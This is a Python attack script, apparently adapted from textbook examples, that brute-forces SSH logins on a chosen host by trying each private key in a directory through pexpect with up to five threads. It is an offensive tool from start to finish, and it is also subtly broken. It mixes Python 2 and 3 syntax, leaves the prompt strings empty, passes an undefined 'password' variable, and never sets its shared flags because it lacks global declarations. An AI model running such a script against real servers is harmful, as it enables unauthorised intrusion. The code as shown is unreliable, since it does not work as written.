#! /usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019-05-10 0:25
# @Author  : Zhang Bin
# @Site    : 
# @File    : ssh_brute_key.py
# @Software: PyCharm
# 使用私钥暴力破解

import pexpect
import optparse
import os
import threading
import time

max_connecting = 5
connection_lock = threading.BoundedSemaphore(max_connecting)

stop = False
fails = 0

def connect(host, user, keyfile, release):
    try:
        perm_denied = 'Permission denied'
        ssh_newkey = ''
        conn_closed = ''
        opt = ''
        conn_str = 'ssh ' + user + '@' + host + ' -i ' + keyfile + opt
        child = pexpect.spawn(conn_str)
        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey,
                            conn_closed, '$', '#',])
        if ret == 2:
            print('[-] Adding host to !/.ssh/known_hosts')
            child.sendline('yes')
            connect(host, user, keyfile, False)
        elif ret == 3:
            print('[-] Connection closed by remote host')
            fails += 1
        elif ret > 3:
            print('[+] Success. ' + str(keyfile))
            stop = True
    except Exception, e:
        if 'read_nonblocking' in str(e):
            fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()

def main():
    parse = optparse.OptionParser('usage: prog -H <target host> '
                                  '-u <user> -d <directory>')
    parse.add_option('-H', dest='tgthost', type='string',
                     help='specify target host')
    parse.add_option('-u', dest='user', type='string',
                     help='specify the user')
    parse.add_option('-d', dest='pass_dir', type='string',
                     help='specify directory with keys')
    (options, args) = parse.parse_args()
    host = options.tgthost
    pass_dir = options.pass_dir
    user = options.user
    if host == None or pass_dir == None or user == None:
        print(parse.usage)
        exit(0)
    for filename in os.listdir(pass_dir):
        if stop:
            print('[*] Exiting:key found.')
            exit(0)
        if fails > 5:
            print('[!] Exiting: too many connections closed by remote host.')
            exit(0)
        connection_lock.acquire()
        fullpath = os.path.join(pass_dir, filename)
        print('[-] Testing keyfile: ' + str(fullpath))
        t = threading.Thread(target=connect, args=(host, user, fullpath, True))
        child = t.start()
if __name__ == '__main__':
    main()